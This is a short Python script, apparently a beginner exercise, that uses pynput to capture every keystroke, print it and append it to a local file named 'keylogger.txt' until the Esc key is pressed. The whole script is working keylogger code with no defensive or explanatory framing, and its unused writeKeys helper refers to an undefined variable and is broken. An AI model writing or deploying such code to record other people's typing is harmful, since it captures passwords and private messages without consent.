from pynput.keyboard import Key, Listener


keys = []

def pressedKey(key):
    # print(key)
    keys.append(key)
    # writeKeys(keys)
    print(key)
    with open('keylogger.txt', 'a') as f:
        new_i = str(key).replace("'", '')
        f.write(f'[{new_i}]')

def writeKeys(key):
    with open('keylogger.txt', 'a') as f:
        for i in key:
            
            f.write(new_i)
            f.write(" ")

def KeyReleased(key):
    if key == Key.esc:
        return False

with Listener(on_press=pressedKey, on_release=KeyReleased) as l:
    l.join()

# 